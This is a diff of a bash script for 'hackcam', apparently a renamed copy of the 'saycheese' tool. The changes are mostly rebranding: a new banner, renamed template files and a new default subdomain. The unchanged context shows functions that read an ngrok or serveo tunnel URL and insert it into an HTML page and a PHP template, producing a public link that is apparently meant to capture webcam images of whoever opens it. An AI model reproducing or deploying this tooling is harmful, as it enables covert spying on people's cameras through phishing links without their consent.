@@ -8,12 +8,12 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  _                 _       \e[0m\e[1;77m ____                          \e[0m\n"
+printf "\e[1;92m  _                _        \e[0m\e[1;77m ____                          \e[0m\n"
 printf "\e[1;92m | |__   __ _  ___| | __    \e[0m\e[1;77m/ ___|  ___ __ _ __ ___        \e[0m\n"
 printf "\e[1;92m | '_ \ / _' |/ __| |/ /    \e[0m\e[1;77m| |    /  _'  | '_ ' _ \       \e[0m\n"
 printf "\e[1;92m | | | | (_| | (__|   <     \e[0m\e[1;77m| |___|  (__| | | | | | |      \e[0m\n"
 printf "\e[1;92m |_| |_|\__,_|\___|_|\_\    \e[0m\e[1;77m\_____|\__,___|_| |_| |_|      \e[0m\n"
-printf "\e[1;92m                            \e[0m                                       \n"
+printf "\e[1;92m   SUTHARSAN                \e[0m    SPARKZ                                   \n"
 
 printf " \e[1;77m v1.1 coded by github.com/sparkz-technology/hackcam\e[0m \n"
 
@@ -122,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' hackcam.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -210,7 +210,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' hackcam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -219,7 +219,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="hackcam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
